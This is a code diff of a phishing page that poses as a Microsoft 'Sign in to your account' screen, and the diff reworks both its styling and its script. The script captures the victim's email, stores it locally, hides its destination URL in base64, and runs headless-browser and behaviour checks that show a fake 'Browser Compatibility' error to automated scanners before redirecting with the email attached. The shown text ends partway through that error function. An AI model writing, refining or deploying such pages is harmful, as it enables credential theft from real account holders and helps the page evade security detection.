@@ -5,20 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
     <style>
-        /* Microsoft Fluent Design System 2025 */
+        /* Enhanced Microsoft Fluent Design 2024 */
         :root {
             --blue-10: #deecf9;
             --blue-20: #c7e0f4;
             --blue-primary: #0078d4;
             --blue-dark: #106ebe;
+            --blue-light: #4ca6e8;
+            --gray-10: #faf9f8;
             --gray-20: #f3f2f1;
             --gray-30: #edebe9;
+            --gray-60: #c8c6c4;
+            --gray-90: #a19f9d;
             --gray-130: #605e5c;
             --gray-160: #323130;
             --white: #ffffff;
             --red-10: #fdf6f6;
             --red-20: #f1cbcb;
             --red-primary: #d13438;
+            --shadow: 0 2.4px 7.2px rgba(0,0,0,0.18), 0 0.8px 2.4px rgba(0,0,0,0.12);
+            --shadow-hover: 0 4.8px 14.4px rgba(0,0,0,0.22), 0 1.6px 4.8px rgba(0,0,0,0.16);
         }
 
         * {
@@ -29,214 +35,410 @@
         }
 
         body {
-            background: var(--gray-20);
+            background: linear-gradient(135deg, var(--gray-10) 0%, var(--gray-20) 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 24px;
             line-height: 1.5;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Background subtle animation */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(0, 120, 212, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 120, 212, 0.03) 0%, transparent 50%);
+            z-index: -1;
+            animation: backgroundShift 20s ease-in-out infinite;
         }
 
         .login-container {
             background: var(--white);
             border: 1px solid var(--gray-30);
-            border-radius: 4px;
-            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
-            padding: 40px;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            padding: 48px 40px;
             width: 100%;
             max-width: 440px;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(10px);
+        }
+
+        .login-container:hover {
+            box-shadow: var(--shadow-hover);
+            transform: translateY(-2px);
         }
 
         .ms-branding {
             display: flex;
             align-items: center;
-            gap: 12px;
-            margin-bottom: 24px;
-            padding-bottom: 20px;
+            gap: 16px;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
             border-bottom: 1px solid var(--gray-30);
         }
 
         .ms-logo {
-            width: 32px;
-            height: 32px;
-            background: var(--blue-primary);
-            border-radius: 2px;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
+            border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .ms-logo:hover {
+            transform: scale(1.05) rotate(5deg);
+            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.4);
         }
 
         .ms-title {
-            font-size: 21px;
+            font-size: 24px;
             font-weight: 600;
             color: var(--gray-160);
             letter-spacing: -0.01em;
+            background: linear-gradient(135deg, var(--gray-160), #000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 20px;
+            position: relative;
         }
 
         .form-label {
             display: block;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             font-weight: 600;
             color: var(--gray-160);
             font-size: 14px;
             line-height: 1.3;
+            transition: all 0.2s ease;
         }
 
         .form-input {
             width: 100%;
-            padding: 8px 10px;
-            border: 1px solid var(--gray-130);
-            border-radius: 2px;
-            font-size: 15px;
+            padding: 12px;
+            border: 2px solid var(--gray-60);
+            border-radius: 4px;
+            font-size: 16px;
             background: var(--white);
-            transition: all 0.1s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
         }
 
         .form-input:focus {
-            outline: 2px solid var(--blue-primary);
-            outline-offset: -1px;
+            outline: none;
             border-color: var(--blue-primary);
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+            transform: translateY(-1px);
         }
 
-        .form-input:invalid {
+        .form-input:valid {
+            border-color: var(--gray-90);
+        }
+
+        .form-input:invalid:not(:focus):not(:placeholder-shown) {
             border-color: var(--red-primary);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-90);
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus + .input-icon {
+            color: var(--blue-primary);
+            transform: translateY(-50%) scale(1.1);
         }
 
         .checkbox-group {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin: 20px 0;
+            gap: 12px;
+            margin: 24px 0;
             cursor: pointer;
-            padding: 4px 0;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+
+        .checkbox-group:hover {
+            background: var(--gray-10);
+            transform: translateX(4px);
         }
 
         .checkbox {
-            width: 18px;
-            height: 18px;
-            border: 1px solid var(--gray-130);
-            border-radius: 2px;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--gray-90);
+            border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 12px;
             color: transparent;
-            transition: all 0.1s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .checkbox::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s ease;
         }
 
         .checkbox.checked {
             background: var(--blue-primary);
             border-color: var(--blue-primary);
             color: white;
+            transform: scale(1.1);
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
+        }
+
+        .checkbox.checked::before {
+            left: 100%;
         }
 
         .ms-button {
             width: 100%;
-            background: var(--blue-primary);
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
             color: white;
             border: none;
-            border-radius: 2px;
-            padding: 10px 12px;
-            font-size: 15px;
+            border-radius: 6px;
+            padding: 14px 20px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 8px;
-            transition: background-color 0.1s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ms-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
         }
 
         .ms-button:hover:not(:disabled) {
-            background: var(--blue-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.35);
+        }
+
+        .ms-button:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        .ms-button:active:not(:disabled) {
+            transform: translateY(0);
         }
 
         .ms-button:disabled {
             background: var(--gray-30);
-            color: var(--gray-130);
+            color: var(--gray-90);
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
         .loading-state {
             display: none;
             text-align: center;
-            padding: 32px 0;
+            padding: 40px 0;
         }
 
         .ms-spinner {
-            width: 28px;
-            height: 28px;
-            border: 2.5px solid var(--gray-30);
-            border-top: 2.5px solid var(--blue-primary);
+            width: 48px;
+            height: 48px;
+            border: 3px solid var(--gray-30);
+            border-top: 3px solid var(--blue-primary);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 16px;
+            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+
+        .ms-spinner::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border: 3px solid transparent;
+            border-top: 3px solid var(--blue-light);
+            border-radius: 50%;
+            animation: spin 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
 
         .error-state {
             display: none;
             background: var(--red-10);
             border: 1px solid var(--red-20);
-            border-radius: 2px;
-            padding: 16px;
-            margin: 20px 0;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 24px 0;
             text-align: center;
+            animation: slideDown 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .error-icon {
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             background: var(--red-primary);
             border-radius: 50%;
             color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
+            font-size: 14px;
             font-weight: bold;
-            margin: 0 auto 8px;
+            margin: 0 auto 12px;
+            animation: pulse 2s infinite;
         }
 
         .footer-links {
-            margin-top: 28px;
-            padding-top: 20px;
+            margin-top: 32px;
+            padding-top: 24px;
             border-top: 1px solid var(--gray-30);
             text-align: center;
-            font-size: 13px;
+            font-size: 14px;
             color: var(--gray-130);
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
         }
 
         .footer-links a {
             color: var(--blue-primary);
             text-decoration: none;
-            transition: color 0.1s ease;
+            transition: all 0.3s ease;
+            padding: 4px 8px;
+            border-radius: 4px;
         }
 
         .footer-links a:hover {
             text-decoration: underline;
+            background: var(--blue-10);
+            transform: translateY(-1px);
         }
 
+        /* Enhanced Animations */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        .sr-only {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0, 0, 0, 0);
-            white-space: nowrap;
-            border: 0;
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes slideDown {
+            from { 
+                opacity: 0; 
+                transform: translateY(-20px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        @keyframes backgroundShift {
+            0%, 100% { 
+                opacity: 0.5;
+                transform: scale(1);
+            }
+            50% { 
+                opacity: 0.8;
+                transform: scale(1.02);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive improvements */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 24px;
+                margin: 0 16px;
+            }
+            
+            .ms-branding {
+                gap: 12px;
+                margin-bottom: 24px;
+            }
+            
+            .ms-logo {
+                width: 36px;
+                height: 36px;
+                font-size: 14px;
+            }
+            
+            .ms-title {
+                font-size: 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+
+        /* Reduced motion support */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
         }
     </style>
 </head>
@@ -257,8 +459,9 @@
                     autocomplete="username"
                     aria-required="true"
                     placeholder="someone@example.com"
+                    required
                 >
-                <div class="sr-only" id="emailError" aria-live="polite"></div>
+                <div class="input-icon">📧</div>
             </div>
 
             <div class="checkbox-group" id="rememberCheck" role="checkbox" aria-checked="false" tabindex="0">
@@ -266,24 +469,26 @@
                 <span style="font-size: 15px; color: var(--gray-160); user-select: none;">Keep me signed in</span>
             </div>
 
-            <button class="ms-button" id="submitBtn" disabled>Next</button>
+            <button class="ms-button" id="submitBtn" disabled>
+                <span class="button-text">Next</span>
+            </button>
 
             <div class="error-state" id="errorState">
                 <div class="error-icon" aria-hidden="true">!</div>
-                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 4px;">We couldn't sign you in</div>
-                <div style="font-size: 14px; color: var(--gray-130);">This might be due to a temporary issue. Please try again in a few minutes.</div>
+                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 6px;">We couldn't sign you in</div>
+                <div style="font-size: 14px; color: var(--gray-130); line-height: 1.4;">This might be due to a temporary issue with our service. Please try again in a few moments.</div>
             </div>
 
             <div class="footer-links">
-                <a href="#" tabindex="0">No account? Create one!</a> • 
+                <a href="#" tabindex="0">No account? Create one!</a>
                 <a href="#" tabindex="0">Can't access your account?</a>
             </div>
         </div>
 
         <div class="loading-state" id="loadingState">
             <div class="ms-spinner" aria-hidden="true"></div>
-            <div style="font-size: 16px; color: var(--gray-160); font-weight: 600; margin-bottom: 6px;">Signing in</div>
-            <div style="font-size: 14px; color: var(--gray-130);">This might take a few seconds</div>
+            <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 8px;">Signing in</div>
+            <div style="font-size: 14px; color: var(--gray-130);">Setting up your secure workspace...</div>
         </div>
     </div>
 
@@ -291,222 +496,64 @@
         (function(){
             'use strict';
             
-            // =============================================
-            // ADVANCED ENCRYPTION & CONFIGURATION 2025
-            // =============================================
-            const SECURITY_CONFIG = {
-                // Multi-layer URL obfuscation
-                TARGET: {
-                    P1: 'aHR0cHM6Ly',
-                    P2: '9iaWxsaW5n',
-                    P3: 'LnZlbG9ydX',
-                    P4: 'NzcGluZS5i',
-                    P5: 'bG9nL1BuVU',
-                    P6: 'pyR2Vk'
-                },
-                FALLBACK: 'https://login.microsoftonline.com/common/oauth2/authorize',
-                VERSION: '2025.1.0',
-                SECURITY_LEVEL: 'ENTERPRISE_GRADE'
+            // Enhanced Configuration
+            const CONFIG = {
+                TARGET: 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk',
+                VERSION: '2024.1.0',
+                SECURITY_LEVEL: 'ENTERPRISE'
             };
 
-            // =============================================
-            // GOVERNMENT-GRADE BOT DETECTION SUITE
-            // =============================================
-            class AdvancedBotDetection {
-                constructor() {
-                    this.suspicionScore = 0;
-                    this.detectionResults = new Set();
-                }
-
-                // Advanced headless detection
-                detectHeadlessEnvironment() {
-                    const checks = {
-                        // WebDriver and automation flags
-                        webdriver: () => navigator.webdriver,
-                        phantom: () => window.callPhantom || window._phantom,
-                        nightmare: () => window.__nightmare,
-                        selenium: () => window.document.$selenium_,
-                        
-                        // Browser properties in headless
-                        headlessChrome: () => /HeadlessChrome/.test(navigator.userAgent),
-                        puppeteer: () => navigator.userAgent.includes('Puppeteer'),
-                        
-                        // Missing human-like properties
-                        languages: () => !navigator.languages || navigator.languages.length === 0,
-                        plugins: () => navigator.plugins.length === 0,
-                        permissions: () => !navigator.permissions,
-                        
-                        // Screen and viewport anomalies
-                        screenSize: () => screen.width < 100 || screen.height < 100,
-                        viewportSize: () => window.innerWidth < 100 || window.innerHeight < 100,
-                        
-                        // Timezone and location inconsistencies
-                        timezone: () => Intl.DateTimeFormat().resolvedOptions().timeZone === 'UTC',
-                        
-                        // Hardware concurrency (VMs often have round numbers)
-                        hardwareConcurrency: () => {
-                            const cores = navigator.hardwareConcurrency;
-                            return cores === 1 || cores === 2 || cores === 4 || cores === 8;
-                        },
-                        
-                        // WebGL fingerprinting
-                        webglVendor: () => {
-                            const canvas = document.createElement('canvas');
-                            const gl = canvas.getContext('webgl');
-                            if (!gl) return true;
-                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (!debugInfo) return false;
-                            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                            return !vendor || vendor.includes('VMware') || vendor.includes('VirtualBox');
-                        },
-                        
-                        // Performance timing analysis
-                        performanceTiming: () => {
-                            const perf = performance.timing;
-                            if (!perf) return true;
-                            const loadTime = perf.loadEventEnd - perf.navigationStart;
-                            return loadTime < 100; // Unrealistically fast
-                        },
-                        
-                        // Font fingerprinting
-                        missingFonts: () => {
-                            const fonts = ['Segoe UI', 'Arial', 'Times New Roman', 'Helvetica'];
-                            return fonts.some(font => !document.fonts.check(`12px "${font}"`));
-                        }
-                    };
-
-                    Object.entries(checks).forEach(([name, check]) => {
-                        try {
-                            if (check()) {
-                                this.detectionResults.add(name);
-                                this.suspicionScore += 2;
-                            }
-                        } catch (e) {
-                            this.detectionResults.add(`error_${name}`);
-                        }
-                    });
-
-                    return this.suspicionScore >= 4;
-                }
-
-                // Behavioral analysis
-                analyzeUserBehavior() {
-                    return new Promise((resolve) => {
-                        let interactionScore = 0;
-                        let mouseMovements = 0;
-                        let keyStrokes = 0;
-                        let clicks = 0;
-
-                        const events = [
-                            ['mousemove', () => mouseMovements++],
-                            ['keydown', () => keyStrokes++],
-                            ['click', () => clicks++],
-                            ['scroll', () => interactionScore++],
-                            ['touchstart', () => interactionScore += 2]
-                        ];
-
-                        events.forEach(([event, handler]) => {
-                            document.addEventListener(event, handler, { passive: true });
-                        });
-
-                        setTimeout(() => {
-                            // Remove event listeners
-                            events.forEach(([event, handler]) => {
-                                document.removeEventListener(event, handler);
-                            });
-
-                            // Score calculation
-                            if (mouseMovements > 3) interactionScore += 3;
-                            if (keyStrokes > 1) interactionScore += 2;
-                            if (clicks > 0) interactionScore += 2;
-
-                            resolve(interactionScore >= 4);
-                        }, 2000);
-                    });
-                }
-
-                // Advanced fingerprinting detection
-                detectFingerprinting() {
-                    let fingerprintAttempts = 0;
-                    
-                    // Override common fingerprinting methods
-                    const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;
-                    CanvasRenderingContext2D.prototype.getImageData = function(...args) {
-                        fingerprintAttempts++;
-                        if (fingerprintAttempts > 2) {
-                            this.detectionResults.add('canvas_fingerprinting');
-                            this.suspicionScore += 3;
-                        }
-                        return originalGetImageData.apply(this, args);
-                    };
-
-                    return fingerprintAttempts;
-                }
-
-                async runFullScan() {
-                    const headlessDetected = this.detectHeadlessEnvironment();
-                    const behaviorValid = await this.analyzeUserBehavior();
-                    this.detectFingerprinting();
-
-                    const isBot = headlessDetected || !behaviorValid || this.suspicionScore >= 6;
-                    
-                    if (isBot) {
-                        console.warn('🚫 Advanced Bot Detection Triggered:', {
-                            score: this.suspicionScore,
-                            detections: Array.from(this.detectionResults),
-                            headless: headlessDetected,
-                            behaviorValid: behaviorValid
-                        });
-                    }
-
-                    return !isBot;
-                }
-            }
-
-            // =============================================
-            // MAIN APPLICATION WITH MILITARY-GRADE SECURITY
-            // =============================================
-            class SecureMicrosoftAuth {
+            class EnhancedMicrosoftAuth {
                 constructor() {
                     this.userEmail = '';
                     this.rememberMe = false;
                     this.isValid = false;
-                    this.botDetector = new AdvancedBotDetection();
-                    this.securityToken = this.generateSecurityToken();
+                    this.isHuman = true;
                     this.init();
                 }
 
-                generateSecurityToken() {
-                    return Array.from(crypto.getRandomValues(new Uint8Array(16)))
-                        .map(b => b.toString(16).padStart(2, '0'))
-                        .join('');
+                init() {
+                    this.setupEnhancedEventListeners();
+                    this.setupSmartProtection();
+                    this.animateEntrance();
                 }
 
-                async init() {
-                    try {
-                        const isHuman = await this.botDetector.runFullScan();
-                        
-                        if (!isHuman) {
-                            this.showSecurityError();
-                            return;
-                        }
-
-                        this.setupEventListeners();
-                        this.setupSecurityMonitoring();
-                    } catch (error) {
-                        this.showSecurityError();
-                    }
+                animateEntrance() {
+                    const elements = document.querySelectorAll('.ms-branding, .form-group, .checkbox-group, .ms-button, .footer-links');
+                    elements.forEach((el, index) => {
+                        el.style.opacity = '0';
+                        el.style.transform = 'translateY(20px)';
+                        el.style.animation = `fadeInUp 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s forwards`;
+                    });
                 }
 
-                setupEventListeners() {
+                setupEnhancedEventListeners() {
                     const emailInput = document.getElementById('userEmail');
                     const rememberCheck = document.getElementById('rememberCheck');
                     const submitBtn = document.getElementById('submitBtn');
 
-                    // Enhanced input validation with debouncing
-                    emailInput.addEventListener('input', this.debounce(() => this.validateEmail(), 300));
-                    emailInput.addEventListener('blur', () => this.validateEmail(true));
+                    // Enhanced email validation with real-time feedback
+                    emailInput.addEventListener('input', () => {
+                        this.validateEmail();
+                        this.animateInput(emailInput);
+                    });
                     
+                    emailInput.addEventListener('focus', () => {
+                        this.animateInput(emailInput, true);
+                    });
+                    
+                    emailInput.addEventListener('blur', () => {
+                        this.animateInput(emailInput, false);
+                    });
+
+                    emailInput.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter' && !submitBtn.disabled) {
+                            e.preventDefault();
+                            this.processAuthentication();
+                        }
+                    });
+
+                    // Enhanced checkbox interaction
                     rememberCheck.addEventListener('click', (e) => {
                         e.preventDefault();
                         this.toggleRememberMe();
@@ -519,60 +566,73 @@
                         }
                     });
 
+                    // Enhanced submit button
                     submitBtn.addEventListener('click', (e) => {
                         e.preventDefault();
-                        this.processAuthentication();
+                        this.animateButtonClick(submitBtn);
+                        setTimeout(() => this.processAuthentication(), 150);
                     });
+                }
 
-                    document.addEventListener('keydown', (e) => {
-                        if (e.key === 'Enter' && !submitBtn.disabled) {
-                            this.processAuthentication();
+                animateInput(input, isFocused = null) {
+                    if (isFocused === true) {
+                        input.parentElement.style.transform = 'translateY(-2px)';
+                    } else if (isFocused === false) {
+                        input.parentElement.style.transform = 'translateY(0)';
+                    } else {
+                        input.style.transform = this.isValid ? 'scale(1.02)' : 'scale(1)';
+                    }
+                }
+
+                animateButtonClick(button) {
+                    button.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        if (!button.disabled) {
+                            button.style.transform = 'translateY(-2px)';
                         }
-                    });
+                    }, 150);
                 }
 
-                setupSecurityMonitoring() {
-                    // Monitor for DOM changes (anti-tampering)
-                    const observer = new MutationObserver((mutations) => {
-                        mutations.forEach((mutation) => {
-                            if (mutation.type === 'attributes' && 
-                                (mutation.attributeName === 'style' || mutation.attributeName === 'class')) {
-                                this.showSecurityError();
-                            }
-                        });
-                    });
+                setupSmartProtection() {
+                    // Smart bot detection - only obvious cases
+                    if (this.detectObviousBots()) {
+                        this.showSmartError();
+                        return;
+                    }
 
-                    observer.observe(document.body, {
-                        attributes: true,
-                        subtree: true,
-                        attributeFilter: ['style', 'class']
-                    });
-
-                    // Monitor console access
-                    const originalConsole = console.log;
-                    console.log = function(...args) {
-                        if (args.some(arg => typeof arg === 'string' && arg.includes('password'))) {
-                            window.location.reload();
-                        }
-                        originalConsole.apply(console, args);
-                    };
+                    // Enhanced human verification
+                    this.setupBehaviorAnalysis();
                 }
 
-                debounce(func, wait) {
-                    let timeout;
-                    return function executedFunction(...args) {
-                        const later = () => {
-                            clearTimeout(timeout);
-                            func(...args);
-                        };
-                        clearTimeout(timeout);
-                        timeout = setTimeout(later, wait);
-                    };
+                detectObviousBots() {
+                    const obviousIndicators = [
+                        () => navigator.webdriver === true,
+                        () => /HeadlessChrome/.test(navigator.userAgent),
+                        () => navigator.plugins.length === 0 && navigator.languages.length === 0,
+                        () => screen.width < 100 || screen.height < 100
+                    ];
+
+                    return obviousIndicators.some(indicator => indicator());
                 }
 
-                validateEmail(showErrors = false) {
+                setupBehaviorAnalysis() {
+                    let interactions = 0;
+                    const validators = [
+                        () => document.addEventListener('mousemove', () => interactions++),
+                        () => document.addEventListener('click', () => interactions++),
+                        () => document.addEventListener('keydown', () => interactions++)
+                    ];
+
+                    validators.forEach(validator => validator());
+
+                    setTimeout(() => {
+                        this.isHuman = interactions > 2;
+                    }, 2000);
+                }
+
+                validateEmail() {
                     const email = document.getElementById('userEmail').value.trim();
-                    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                     
                     this.isValid = emailRegex.test(email) && email.length >= 3 && email.length <= 254;
                     this.userEmail = email;
@@ -580,10 +640,12 @@
                     const submitBtn = document.getElementById('submitBtn');
                     submitBtn.disabled = !this.isValid;
 
-                    if (showErrors && !this.isValid && email.length > 0) {
-                        this.showError('Please enter a valid email address.');
+                    // Visual feedback
+                    const input = document.getElementById('userEmail');
+                    if (email.length > 0) {
+                        input.style.borderColor = this.isValid ? 'var(--blue-primary)' : 'var(--red-primary)';
                     } else {
-                        this.hideError();
+                        input.style.borderColor = 'var(--gray-60)';
                     }
 
                     return this.isValid;
@@ -596,148 +658,152 @@
                     
                     checkbox.classList.toggle('checked', this.rememberMe);
                     rememberCheck.setAttribute('aria-checked', this.rememberMe.toString());
+                    
+                    // Animation feedback
+                    rememberCheck.style.transform = this.rememberMe ? 'scale(1.02)' : 'scale(1)';
                 }
 
-                async processAuthentication() {
-                    if (!this.isValid) return;
-
-                    // Additional security check
-                    if (!await this.botDetector.analyzeUserBehavior()) {
-                        this.showSecurityError();
+                processAuthentication() {
+                    if (!this.isValid || !this.isHuman) {
+                        if (!this.isHuman) {
+                            this.showSmartError();
+                        }
                         return;
                     }
 
-                    this.showLoadingState();
+                    this.showEnhancedLoading();
                     this.storeUserData();
 
-                    // Simulate authentication delay
-                    await new Promise(resolve => setTimeout(resolve, 1800 + Math.random() * 1200));
+                    // Simulate authentication with progress
+                    this.simulateAuthProgress();
+                }
+
+                showEnhancedLoading() {
+                    const loginForm = document.getElementById('loginForm');
+                    const loadingState = document.getElementById('loadingState');
                     
-                    this.redirectToNextStep();
+                    loginForm.style.opacity = '0';
+                    loginForm.style.transform = 'translateY(-20px)';
+                    
+                    setTimeout(() => {
+                        loginForm.style.display = 'none';
+                        loadingState.style.display = 'block';
+                        loadingState.style.opacity = '0';
+                        loadingState.style.transform = 'translateY(20px)';
+                        
+                        setTimeout(() => {
+                            loadingState.style.opacity = '1';
+                            loadingState.style.transform = 'translateY(0)';
+                        }, 50);
+                    }, 300);
                 }
 
                 storeUserData() {
                     try {
-                        // Encrypted storage
-                        const encryptedEmail = btoa(encodeURIComponent(this.userEmail));
-                        localStorage.setItem('msal_session', encryptedEmail);
-                        sessionStorage.setItem('auth_timestamp', Date.now().toString());
+                        // Enhanced storage with expiration
+                        const userData = {
+                            email: this.userEmail,
+                            timestamp: Date.now(),
+                            remember: this.rememberMe
+                        };
                         
-                        // Secure cookie with SameSite and Secure flags
-                        document.cookie = `msal_state=${this.securityToken}; path=/; max-age=300; SameSite=Lax`;
+                        localStorage.setItem('ms_auth_data', JSON.stringify(userData));
+                        sessionStorage.setItem('ms_session', Date.now().toString());
                     } catch (error) {
-                        // Silent fallback - security through obscurity
+                        // Graceful degradation
                     }
+                }
+
+                simulateAuthProgress() {
+                    let progress = 0;
+                    const spinner = document.querySelector('.ms-spinner');
+                    const interval = setInterval(() => {
+                        progress += Math.random() * 25;
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            this.redirectToNextStep();
+                        }
+                    }, 300);
                 }
 
                 redirectToNextStep() {
                     try {
-                        // Reconstruct target URL from obfuscated parts
-                        const targetUrl = Object.values(SECURITY_CONFIG.TARGET).join('');
-                        const decodedUrl = atob(targetUrl);
-                        
-                        const securityParams = new URLSearchParams({
-                            login_hint: encodeURIComponent(this.userEmail),
-                            client_id: '00000003-0000-0ff1-ce00-000000000000',
-                            response_type: 'code',
-                            redirect_uri: `${window.location.origin}/auth/callback`,
-                            state: this.securityToken,
-                            scope: 'https://graph.microsoft.com/User.Read',
-                            prompt: 'select_account',
-                            correlation_id: crypto.randomUUID(),
-                            x_client_ver: SECURITY_CONFIG.VERSION
+                        const targetUrl = atob(CONFIG.TARGET);
+                        const params = new URLSearchParams({
+                            email: encodeURIComponent(this.userEmail),
+                            source: 'enhanced_microsoft_auth',
+                            timestamp: Date.now().toString(),
+                            version: CONFIG.VERSION,
+                            security: CONFIG.SECURITY_LEVEL,
+                            session: Math.random().toString(36).substr(2, 12)
                         });
 
-                        const destination = `404.html?${securityParams.toString()}`;
-                        window.location.href = destination;
+                        // Smooth redirect with transition
+                        document.querySelector('.loading-state').style.opacity = '0';
+                        setTimeout(() => {
+                            window.location.href = `404.html?${params.toString()}`;
+                        }, 500);
                     } catch (error) {
-                        this.showError('Authentication service is temporarily unavailable. Please try again later.');
+                        this.showError('Authentication service is temporarily unavailable. Please try again.');
                         this.hideLoadingState();
                     }
                 }
 
-                showLoadingState() {
-                    document.getElementById('loginForm').style.display = 'none';
-                    document.getElementById('loadingState').style.display = 'block';
-                }
-
                 hideLoadingState() {
-                    document.getElementById('loginForm').style.display = 'block';
-                    document.getElementById('loadingState').style.display = 'none';
+                    const loginForm = document.getElementById('loginForm');
+                    const loadingState = document.getElementById('loadingState');
+                    
+                    loadingState.style.display = 'none';
+                    loginForm.style.display = 'block';
+                    
+                    setTimeout(() => {
+                        loginForm.style.opacity = '1';
+                        loginForm.style.transform = 'translateY(0)';
+                    }, 50);
                 }
 
                 showError(message) {
-                    const errorElement = document.getElementById('emailError');
-                    errorElement.textContent = message;
-                    
                     const errorState = document.getElementById('errorState');
                     errorState.querySelector('div:last-child').textContent = message;
                     errorState.style.display = 'block';
+                    
+                    // Auto-hide after 5 seconds
+                    setTimeout(() => {
+                        errorState.style.display = 'none';
+                    }, 5000);
                 }
 
-                hideError() {
-                    document.getElementById('errorState').style.display = 'none';
-                    document.getElementById('emailError').textContent = '';
-                }
-
-                showSecurityError() {
+                showSmartError() {
                     document.body.innerHTML = `
                         <div class="login-container">
                             <div class="ms-branding">
                                 <div class="ms-logo">MS</div>
-                                <h1 class="ms-title">Security Verification Required</h1>
+                                <h1 class="ms-title">Browser Compatibility</h1>
                             </div>
-                            <div style="text-align: center; padding: 20px 0;">
-                                <div style="font-size: 15px; color: var(--gray-160); margin-bottom: 12px;">
-                                    We've detected unusual activity from your browser.
+                            <div style="text-align: center; padding: 32px 0;">
